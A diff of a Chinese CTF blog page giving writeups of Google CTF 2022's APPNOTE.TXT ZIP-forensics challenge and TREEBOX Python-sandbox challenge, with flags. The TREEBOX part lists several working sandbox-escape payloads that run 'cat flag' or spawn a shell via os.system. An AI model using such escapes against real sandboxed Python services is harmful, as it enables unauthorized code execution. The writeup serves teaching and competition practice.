@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.9.0">
+<meta name="generator" content="Hexo 6.3.0">
 <script data-ad-client="ca-pub-6912066943609875" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
   <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
@@ -54,17 +54,20 @@
 </script>
 
   <meta name="description" content="Google Capture The Flag 2022 Writeup">
-<meta name="keywords" content="CTF,GoogleCTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="GoogleCTF2022 Writeup">
 <meta property="og:url" content="https://zhaoqi.vip/posts/632988450/index.html">
 <meta property="og:site_name" content="温柔小猪">
 <meta property="og:description" content="Google Capture The Flag 2022 Writeup">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2023-07-24T03:06:57.311Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zhaoqi.vip/CTF/GoogleCTF2022/Misc/images/B04B0506.png">
+<meta property="article:published_time" content="2022-07-02T02:27:43.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:06:54.123Z">
+<meta property="article:author" content="Zhao Qi">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="GoogleCTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="GoogleCTF2022 Writeup">
-<meta name="twitter:description" content="Google Capture The Flag 2022 Writeup">
+<meta name="twitter:image" content="https://zhaoqi.vip/CTF/GoogleCTF2022/Misc/images/B04B0506.png">
 
 <link rel="canonical" href="https://zhaoqi.vip/posts/632988450/">
 
@@ -128,6 +131,8 @@
 </noscript>
 
   
+<link rel="alternate" href="/atom.xml" title="温柔小猪" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="温柔小猪" type="application/rss+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -307,14 +312,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>6.3k</span>
+              <span>6.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>10 分钟</span>
+              <span>11 分钟</span>
             </span>
             <div class="post-description">Google Capture The Flag 2022 Writeup</div>
 
@@ -328,7 +333,7 @@
 
       
         <h1 id="APPNOTE-TXT"><a href="#APPNOTE-TXT" class="headerlink" title="APPNOTE.TXT"></a>APPNOTE.TXT</h1><p><em>Every single archive manager unpacks this to a different file…</em></p>
-<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/2551253642bde3066e55c9cc8e9b0b4aa77feadc00c81032da778e6f7c89907135dfc2611fd8617204720dbfadb31429ae11f6ecd202887f4ce99f2f53a3c5e8" target="_blank" rel="noopener">Attachment</a></em></p>
+<p><em><a target="_blank" rel="noopener" href="https://storage.googleapis.com/gctf-2022-attachments-project/2551253642bde3066e55c9cc8e9b0b4aa77feadc00c81032da778e6f7c89907135dfc2611fd8617204720dbfadb31429ae11f6ecd202887f4ce99f2f53a3c5e8">Attachment</a></em></p>
 <hr>
 <p>解压下载得到的文件<code>dump.zip</code>,得到<code>hello.txt</code>: <code>There&#39;s more to it than meets the eye...</code></p>
 <p>猜测可能有隐藏文件,用<code>binwalk</code>分析:</p>
@@ -360,69 +365,69 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 <ul>
 <li>包含文件<code>hi.txt</code>: <code>Find a needle in the haystack...</code></li>
 <li>猜测flag的长度为18,每组<code>flagXX</code>表示了flag中的一个字符</li>
-<li>dump出来任意一组<code>flagXX</code>,得到flag的字母表<code>abcdefghijklmnopqrstuvwxyz{CTF0137}_</code></li>
-<li>已知flag格式为<code>CTF{...}</code></li>
+<li>dump出来任意一组<code>flagXX</code>,得到flag的字母表<code>abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_</code></li>
+<li>已知flag格式为<code>CTF&#123;...&#125;</code></li>
 </ul>
 <pre><code class="bash">~$ strings dump.zip
 V~uK)
-hello.txtThere<span class="string">'s more to it than meets the eye...</span>
-<span class="string">V~uK)</span>
-<span class="string">hello.txtPK</span>
-<span class="string">hi.txtFind a needle in the haystack...</span>
-<span class="string">hi.txtPK</span>
-<span class="string">flag00aPK</span>
-<span class="string">flag00PK</span>
-<span class="string">flag00bPK</span>
-<span class="string">flag00PK</span>
-<span class="string">flag00cPK</span>
-<span class="string">flag00PK</span>
-<span class="string">flag00dPK</span>
-<span class="string">flag00PK</span>
-<span class="string">flag00ePK</span>
-<span class="string">......</span>
-<span class="string">flag18PK</span>
-<span class="string">flag181PK</span>
-<span class="string">flag18PK</span>
-<span class="string">flag183PK</span>
-<span class="string">flag18PK</span>
-<span class="string">flag187PK</span>
-<span class="string">flag18PK</span>
-<span class="string">flag18}PK</span>
-<span class="string">flag18PK</span>
-<span class="string">flag18_PK</span>
-<span class="string">flag18PK</span>
+hello.txtThere&#39;s more to it than meets the eye...
+V~uK)
+hello.txtPK
+hi.txtFind a needle in the haystack...
+hi.txtPK
+flag00aPK
+flag00PK
+flag00bPK
+flag00PK
+flag00cPK
+flag00PK
+flag00dPK
+flag00PK
+flag00ePK
+......
+flag18PK
+flag181PK
+flag18PK
+flag183PK
+flag18PK
+flag187PK
+flag18PK
+flag18&#125;PK
+flag18PK
+flag18_PK
+flag18PK
 </code></pre>
 <pre><code class="bash">~$ hexdump -C dump.zip | head -n 30
 00000000  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 56 7e  |PK............V~|
 00000010  75 4b 29 00 00 00 29 00  00 00 09 00 00 00 68 65  |uK)...).......he|
-00000020  6c 6c 6f 2e 74 78 74 54  68 65 72 65 27 73 20 6d  |llo.txtThere<span class="string">'s m|</span>
-<span class="string">00000030  6f 72 65 20 74 6f 20 69  74 20 74 68 61 6e 20 6d  |ore to it than m|</span>
-<span class="string">00000040  65 65 74 73 20 74 68 65  20 65 79 65 2e 2e 2e 0a  |eets the eye....|</span>
-<span class="string">00000050  50 4b 01 02 00 00 00 00  00 00 00 00 00 00 00 00  |PK..............|</span>
-<span class="string">00000060  56 7e 75 4b 29 00 00 00  29 00 00 00 09 00 00 00  |V~uK)...).......|</span>
-<span class="string">00000070  fd ef 00 00 00 00 00 00  00 00 00 00 00 00 68 65  |..............he|</span>
-<span class="string">00000080  6c 6c 6f 2e 74 78 74 50  4b 03 04 00 00 00 00 00  |llo.txtPK.......|</span>
-<span class="string">00000090  00 00 00 00 00 9a 15 62  e9 21 00 00 00 21 00 00  |.......b.!...!..|</span>
-<span class="string">000000a0  00 06 00 00 00 68 69 2e  74 78 74 46 69 6e 64 20  |.....hi.txtFind |</span>
-<span class="string">000000b0  61 20 6e 65 65 64 6c 65  20 69 6e 20 74 68 65 20  |a needle in the |</span>
-<span class="string">000000c0  68 61 79 73 74 61 63 6b  2e 2e 2e 0a 50 4b 01 02  |haystack....PK..|</span>
-<span class="string">000000d0  00 00 00 00 00 00 00 00  00 00 00 00 9a 15 62 e9  |..............b.|</span>
-<span class="string">000000e0  21 00 00 00 21 00 00 00  06 00 00 00 84 ef 00 00  |!...!...........|</span>
-<span class="string">000000f0  00 00 00 00 00 00 87 00  00 00 68 69 2e 74 78 74  |..........hi.txt|</span>
-<span class="string">00000100  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 43 be  |PK............C.|</span>
-<span class="string">00000110  b7 e8 01 00 00 00 01 00  00 00 06 00 00 00 66 6c  |..............fl|</span>
-<span class="string">00000120  61 67 30 30 61 50 4b 01  02 00 00 00 00 00 00 00  |ag00aPK.........|</span>
-<span class="string">00000130  00 00 00 00 00 43 be b7  e8 01 00 00 00 01 00 00  |.....C..........|</span>
-<span class="string">00000140  00 06 00 00 00 2b ef 00  00 00 00 00 00 00 00 00  |.....+..........|</span>
-<span class="string">00000150  01 00 00 66 6c 61 67 30  30 50 4b 03 04 00 00 00  |...flag00PK.....|</span>
-<span class="string">00000160  00 00 00 00 00 00 00 f9  ef be 71 01 00 00 00 01  |..........q.....|</span>
-<span class="string">00000170  00 00 00 06 00 00 00 66  6c 61 67 30 30 62 50 4b  |.......flag00bPK|</span>
-<span class="string">00000180  01 02 00 00 00 00 00 00  00 00 00 00 00 00 f9 ef  |................|</span>
-<span class="string">00000190  be 71 01 00 00 00 01 00  00 00 06 00 00 00 d2 ee  |.q..............|</span>
-<span class="string">000001a0  00 00 00 00 00 00 00 00  59 01 00 00 66 6c 61 67  |........Y...flag|</span>
-<span class="string">000001b0  30 30 50 4b 03 04 00 00  00 00 00 00 00 00 00 00  |00PK............|</span>
-<span class="string">000001c0  6f df b9 06 01 00 00 00  01 00 00 00 06 00 00 00  |o...............|</span>
-<span class="string">000001d0  66 6c 61 67 30 30 63 50  4b 01 02 00 00 00 00 00  |flag00cPK.......|</span>
+00000020  6c 6c 6f 2e 74 78 74 54  68 65 72 65 27 73 20 6d  |llo.txtThere&#39;s m|
+00000030  6f 72 65 20 74 6f 20 69  74 20 74 68 61 6e 20 6d  |ore to it than m|
+00000040  65 65 74 73 20 74 68 65  20 65 79 65 2e 2e 2e 0a  |eets the eye....|
+00000050  50 4b 01 02 00 00 00 00  00 00 00 00 00 00 00 00  |PK..............|
+00000060  56 7e 75 4b 29 00 00 00  29 00 00 00 09 00 00 00  |V~uK)...).......|
+00000070  fd ef 00 00 00 00 00 00  00 00 00 00 00 00 68 65  |..............he|
+00000080  6c 6c 6f 2e 74 78 74 50  4b 03 04 00 00 00 00 00  |llo.txtPK.......|
+00000090  00 00 00 00 00 9a 15 62  e9 21 00 00 00 21 00 00  |.......b.!...!..|
+000000a0  00 06 00 00 00 68 69 2e  74 78 74 46 69 6e 64 20  |.....hi.txtFind |
+000000b0  61 20 6e 65 65 64 6c 65  20 69 6e 20 74 68 65 20  |a needle in the |
+000000c0  68 61 79 73 74 61 63 6b  2e 2e 2e 0a 50 4b 01 02  |haystack....PK..|
+000000d0  00 00 00 00 00 00 00 00  00 00 00 00 9a 15 62 e9  |..............b.|
+000000e0  21 00 00 00 21 00 00 00  06 00 00 00 84 ef 00 00  |!...!...........|
+000000f0  00 00 00 00 00 00 87 00  00 00 68 69 2e 74 78 74  |..........hi.txt|
+00000100  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 43 be  |PK............C.|
+00000110  b7 e8 01 00 00 00 01 00  00 00 06 00 00 00 66 6c  |..............fl|
+00000120  61 67 30 30 61 50 4b 01  02 00 00 00 00 00 00 00  |ag00aPK.........|
+00000130  00 00 00 00 00 43 be b7  e8 01 00 00 00 01 00 00  |.....C..........|
+00000140  00 06 00 00 00 2b ef 00  00 00 00 00 00 00 00 00  |.....+..........|
+00000150  01 00 00 66 6c 61 67 30  30 50 4b 03 04 00 00 00  |...flag00PK.....|
+00000160  00 00 00 00 00 00 00 f9  ef be 71 01 00 00 00 01  |..........q.....|
+00000170  00 00 00 06 00 00 00 66  6c 61 67 30 30 62 50 4b  |.......flag00bPK|
+00000180  01 02 00 00 00 00 00 00  00 00 00 00 00 00 f9 ef  |................|
+00000190  be 71 01 00 00 00 01 00  00 00 06 00 00 00 d2 ee  |.q..............|
+000001a0  00 00 00 00 00 00 00 00  59 01 00 00 66 6c 61 67  |........Y...flag|
+000001b0  30 30 50 4b 03 04 00 00  00 00 00 00 00 00 00 00  |00PK............|
+000001c0  6f df b9 06 01 00 00 00  01 00 00 00 06 00 00 00  |o...............|
+000001d0  66 6c 61 67 30 30 63 50  4b 01 02 00 00 00 00 00  |flag00cPK.......|
 </code></pre>
 <p>参照ZIP文件格式,按照<code>504B0304</code>、<code>504B0102</code>、<code>504B0506</code>分隔<code>dump.zip</code>的<a href="../../CTF/GoogleCTF2022/Misc/hex.out">十六进制表示形式</a>,分析发现:</p>
 <ul>
@@ -430,95 +435,95 @@ hello.txtThere<span class="string">'s more to it than meets the eye...</span>
 <li><code>flagXX</code>的文件实体为37字节、目录源数据为52字节</li>
 <li>每组<code>flagXX</code>共占用(37 + 53) * 36字节</li>
 </ul>
-<p><img data-src="../../CTF/GoogleCTF2022/Misc/images/B04B0506.png" alt="B04B0506"></p>
+<p><img data-src="/../../CTF/GoogleCTF2022/Misc/images/B04B0506.png" alt="B04B0506"></p>
 <p>发现结尾多了18个目录数据源结束标识,猜测可能以此还原文件,以<code>flag00</code>为例:</p>
 <p>目录源数据的开始位置偏移为<code>0x880A0000</code>,用小端表示为<code>0x00000A88</code>(2696),减去<code>hello.txt</code>和<code>hi.txt</code>的256字节,减去第一个文件实体的37字节,然后除以(37+52)得到27,指向<code>flag00</code>这一组的第27个文件实体(从0开始),即字符C.基于flag的格式以C开头,大胆猜测这就是正确答案.</p>
 <p>剩下的过程与之类似,可以使用脚本简化:</p>
-<pre><code class="python">data = <span class="string">"""\</span>
-<span class="string">880A0000</span>
-<span class="string">65170000</span>
-<span class="string">42240000</span>
-<span class="string">BB2F0000</span>
-<span class="string">6C380000</span>
-<span class="string">274A0000</span>
-<span class="string">7F520000</span>
-<span class="string">3A640000</span>
-<span class="string">71690000</span>
-<span class="string">377C0000</span>
-<span class="string">587F0000</span>
-<span class="string">F1950000</span>
-<span class="string">3E9D0000</span>
-<span class="string">5EA80000</span>
-<span class="string">88BC0000</span>
-<span class="string">92C50000</span>
-<span class="string">2CD40000</span>
-<span class="string">20DB0000</span>
-<span class="string">3FEE0000</span>
-<span class="string">"""</span>.split()
+<pre><code class="python">data = &quot;&quot;&quot;\
+880A0000
+65170000
+42240000
+BB2F0000
+6C380000
+274A0000
+7F520000
+3A640000
+71690000
+377C0000
+587F0000
+F1950000
+3E9D0000
+5EA80000
+88BC0000
+92C50000
+2CD40000
+20DB0000
+3FEE0000
+&quot;&quot;&quot;.split()
 print(len(data))
 
-CHOICES = <span class="string">'abcdefghijklmnopqrstuvwxyz{CTF0137}_'</span>
+CHOICES = &#39;abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_&#39;
 ans = list()
 
-<span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(s)</span>:</span>
-      <span class="comment"># 大端转小端</span>
-    a = [s[<span class="number">2</span> * i:<span class="number">2</span> * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s) // <span class="number">2</span>)]
+def conv(s):
+      # 大端转小端
+    a = [s[2 * i:2 * (i + 1)] for i in range(len(s) // 2)]
     a.reverse()
-    <span class="keyword">return</span> <span class="string">''</span>.join(a)
+    return &#39;&#39;.join(a)
 
-<span class="keyword">for</span> i,item <span class="keyword">in</span> enumerate(data):
-    t = int(conv(item), <span class="number">16</span>) - <span class="number">256</span> - <span class="number">37</span>
-    tt = t // (<span class="number">37</span> + <span class="number">52</span>)
-    ttt = tt - <span class="number">36</span> * i
+for i,item in enumerate(data):
+    t = int(conv(item), 16) - 256 - 37
+    tt = t // (37 + 52)
+    ttt = tt - 36 * i
     ans.append(CHOICES[ttt])
-    print(<span class="string">''</span>.join(ans))
+    print(&#39;&#39;.join(ans))
 </code></pre>
-<p>flag:<code>CTF{p0s7m0d3rn_z1p}</code></p>
+<p>flag:<code>CTF&#123;p0s7m0d3rn_z1p&#125;</code></p>
 <p>参考</p>
 <ul>
-<li><a href="https://xz.aliyun.com/t/3994" target="_blank" rel="noopener">从做CTF题到手撕ZIP</a></li>
-<li><a href="http://lordaeronesz.top/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">ZIP格式分析</a></li>
-<li><a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT" target="_blank" rel="noopener">.ZIP File Format Specification</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3994">从做CTF题到手撕ZIP</a></li>
+<li><a target="_blank" rel="noopener" href="http://lordaeronesz.top/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">ZIP格式分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">.ZIP File Format Specification</a></li>
 </ul>
 <h1 id="TREEBOX"><a href="#TREEBOX" class="headerlink" title="TREEBOX"></a>TREEBOX</h1><p><em>I think I finally got Python sandboxing right.</em></p>
-<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301" target="_blank" rel="noopener">Attachment</a> <code>treebox.2022.ctfcompetition.com 1337</code></em></p>
+<p><em><a target="_blank" rel="noopener" href="https://storage.googleapis.com/gctf-2022-attachments-project/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301">Attachment</a> <code>treebox.2022.ctfcompetition.com 1337</code></em></p>
 <hr>
-<pre><code class="python"><span class="comment">#!/usr/bin/python3 -u</span>
-<span class="comment">#</span>
-<span class="comment"># Flag is in a file called "flag" in cwd.</span>
-<span class="comment">#</span>
-<span class="comment"># Quote from Dockerfile:</span>
-<span class="comment">#   FROM ubuntu:22.04</span>
-<span class="comment">#   RUN apt-get update &amp;&amp; apt-get install -y python3</span>
-<span class="comment">#</span>
-<span class="keyword">import</span> ast
-<span class="keyword">import</span> sys
-<span class="keyword">import</span> os
+<pre><code class="python">#!/usr/bin/python3 -u
+#
+# Flag is in a file called &quot;flag&quot; in cwd.
+#
+# Quote from Dockerfile:
+#   FROM ubuntu:22.04
+#   RUN apt-get update &amp;&amp; apt-get install -y python3
+#
+import ast
+import sys
+import os
 
-<span class="function"><span class="keyword">def</span> <span class="title">verify_secure</span><span class="params">(m)</span>:</span>
-  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):
+def verify_secure(m):
+  for x in ast.walk(m):
     match type(x):
       case (ast.Import|ast.ImportFrom|ast.Call):
-        print(<span class="string">f"ERROR: Banned statement <span class="subst">{x}</span>"</span>)
-        <span class="keyword">return</span> <span class="literal">False</span>
-  <span class="keyword">return</span> <span class="literal">True</span>
+        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
+        return False
+  return True
 
 abspath = os.path.abspath(__file__)
 dname = os.path.dirname(abspath)
 os.chdir(dname)
 
-print(<span class="string">"-- Please enter code (last line must contain only --END)"</span>)
-source_code = <span class="string">""</span>
-<span class="keyword">while</span> <span class="literal">True</span>:
+print(&quot;-- Please enter code (last line must contain only --END)&quot;)
+source_code = &quot;&quot;
+while True:
   line = sys.stdin.readline()
-  <span class="keyword">if</span> line.startswith(<span class="string">"--END"</span>):
-    <span class="keyword">break</span>
+  if line.startswith(&quot;--END&quot;):
+    break
   source_code += line
 
-tree = compile(source_code, <span class="string">"input.py"</span>, <span class="string">'exec'</span>, flags=ast.PyCF_ONLY_AST)
-<span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span>
-  print(<span class="string">"-- Executing safe code:"</span>)
-  compiled = compile(source_code, <span class="string">"input.py"</span>, <span class="string">'exec'</span>)
+tree = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;, flags=ast.PyCF_ONLY_AST)
+if verify_secure(tree):  # Safe to execute!
+  print(&quot;-- Executing safe code:&quot;)
+  compiled = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;)
   exec(compiled)
 </code></pre>
 <p>阅读源码,可以发现:</p>
@@ -535,56 +540,56 @@ tree = compile(source_code, <span class="string">"input.py"</span>, <span class=
 </ul>
 <p>我的解法:</p>
 <p>在python中使用<code>in</code>运算符时,默认会调用<code>__contains__</code>方法,并且会将需要判断的对象作为形参传入;</p>
-<p>所以我们可以用<code>os.system</code>覆盖现有的python对象/类上的<code>__contains__</code>方法,然后通过运算符来调用<code>system</code>函数.</p>
+<p>所以我们可以用<code>os.system</code>覆盖现有的python对象&#x2F;类上的<code>__contains__</code>方法,然后通过运算符来调用<code>system</code>函数.</p>
 <pre><code class="python">os.environ.__class__.__contains__ = os.system
-<span class="string">'cat flag'</span> <span class="keyword">in</span> os.environ
+&#39;cat flag&#39; in os.environ
 </code></pre>
 <p>其他解法:</p>
 <ol>
 <li><p>装饰器</p>
-<pre><code class="python"><span class="meta">@exec</span>
-<span class="meta">@input</span>
-<span class="class"><span class="keyword">class</span> <span class="title">X</span>:</span>
-  <span class="keyword">pass</span>
+<pre><code class="python">@exec
+@input
+class X:
+  pass
 </code></pre>
 </li>
 <li><p>异常</p>
-<pre><code class="python"><span class="class"><span class="keyword">class</span> <span class="title">MyException</span><span class="params">(Exception)</span>:</span>
-  <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span>
-    <span class="keyword">return</span> <span class="string">'cat flag'</span>
+<pre><code class="python">class MyException(Exception):
+  def __str__(self):
+    return &#39;cat flag&#39;
 
 sys.stdout.write=os.system
 sys.stderr.write=os.system
 
-<span class="keyword">raise</span> MyException   
+raise MyException   
 </code></pre>
-<pre><code class="python"><span class="class"><span class="keyword">class</span> <span class="title">X</span>:</span>
-    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, a, b, c)</span>:</span>
-        self += <span class="string">"os.system('sh')"</span>
-    __iadd__ = <span class="keyword">exec</span>
+<pre><code class="python">class X:
+    def __init__(self, a, b, c):
+        self += &quot;os.system(&#39;sh&#39;)&quot;
+    __iadd__ = exec
 sys.excepthook = X
-<span class="number">1</span>/<span class="number">0</span>
+1/0
 </code></pre>
 </li>
 <li><p>元类</p>
-<pre><code class="python"><span class="comment"># This will define the members on the "sub"class</span>
-<span class="class"><span class="keyword">class</span> <span class="title">Metaclass</span>:</span>
-    __getitem__ = <span class="keyword">exec</span> <span class="comment"># So Sub[string] will execute exec(string)</span>
-<span class="comment"># Note: Metaclass.__class__ == type</span>
+<pre><code class="python"># This will define the members on the &quot;sub&quot;class
+class Metaclass:
+    __getitem__ = exec # So Sub[string] will execute exec(string)
+# Note: Metaclass.__class__ == type
+    
+class Sub(metaclass=Metaclass): # That&#39;s how we make Sub.__class__ == Metaclass
+    pass # Nothing special to do
 
-<span class="class"><span class="keyword">class</span> <span class="title">Sub</span><span class="params">(metaclass=Metaclass)</span>:</span> <span class="comment"># That's how we make Sub.__class__ == Metaclass</span>
-    <span class="keyword">pass</span> <span class="comment"># Nothing special to do</span>
-
-<span class="keyword">assert</span> isinstance(Sub, Metaclass)
-sub[<span class="string">'import os; os.system("sh")'</span>]
+assert isinstance(Sub, Metaclass)
+sub[&#39;import os; os.system(&quot;sh&quot;)&#39;]
 </code></pre>
 </li>
 </ol>
 <p>其他Writeup</p>
 <ul>
-<li><a href="https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/" target="_blank" rel="noopener">GCTF 2022 Treebox</a></li>
+<li><a target="_blank" rel="noopener" href="https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/">GCTF 2022 Treebox</a></li>
 </ul>
-<p><strong>flag:</strong><code>CTF{CzeresniaTopolaForsycja}</code></p>
+<p><strong>flag:</strong><code>CTF&#123;CzeresniaTopolaForsycja&#125;</code></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
 
@@ -598,16 +603,16 @@ sub[<span class="string">'import os; os.system("sh")'</span>]
       <div class="popular-posts-title"><a href="/posts/851556193/" rel="bookmark">GoogleCTF2023 Writeup</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/501486646/" rel="bookmark">TFCCTF2021 Writeup</a></div>
+      <div class="popular-posts-title"><a href="/posts/4120451577/" rel="bookmark">BuckeyeCTF2021 Writeup</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/2879210530/" rel="bookmark">DEADFACECTF Writeup</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/2302350511/" rel="bookmark">DownUnderCTF2021 Writeup</a></div>
     </li>
     <li class="popular-posts-item">
       <div class="popular-posts-title"><a href="/posts/3427623925/" rel="bookmark">K3RN3LCTF2021 Writeup</a></div>
-    </li>
-    <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/98571386/" rel="bookmark">L3HCTF2021-个人能力认证 Writeup</a></div>
-    </li>
-    <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/2621990551/" rel="bookmark">KillerQueenCTF2021 Writeup</a></div>
     </li>
   </ul>
 
@@ -794,16 +799,16 @@ sub[<span class="string">'import os; os.system("sh")'</span>]
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/ZhaoQi99" title="GitHub → https://github.com/ZhaoQi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/ZhaoQi99" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ZhaoQi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://www.linkedin.com/in/zhaoqi99" title="Linkedin → https://www.linkedin.com/in/zhaoqi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-linkedin"></i>Linkedin</a>
+        <a href="https://www.linkedin.com/in/zhaoqi99" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;zhaoqi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-linkedin"></i>Linkedin</a>
       </span>
       <span class="links-of-author-item">
         <a href="mailto:zhaoqi99@outlook.com" title="E-Mail → mailto:zhaoqi99@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" title="QQ → tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;956361916&amp;website&#x3D;www.oicqzone.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
       </span>
   </div>
 
@@ -840,13 +845,13 @@ sub[<span class="string">'import os; os.system("sh")'</span>]
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">203k</span>
+    <span title="站点总字数">214k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">5:38</span>
+    <span title="站点阅读时长">5:56</span>
 </div>
   <div class="addthis_inline_share_toolbox">
     <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5a73dc9a89a291e2" async="async"></script>
@@ -990,9 +995,19 @@ sub[<span class="string">'import os; os.system("sh")'</span>]
   <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
-<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
 <script src="/js/schemes/pisces.js"></script>
-<script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
 
   <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js"></script>
     <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three-waves.min.js"></script>
@@ -1014,7 +1029,9 @@ sub[<span class="string">'import os; os.system("sh")'</span>]
 
 
 
-  <script src="/js/local-search.js"></script>
+  
+<script src="/js/local-search.js"></script>
+
 
 
 
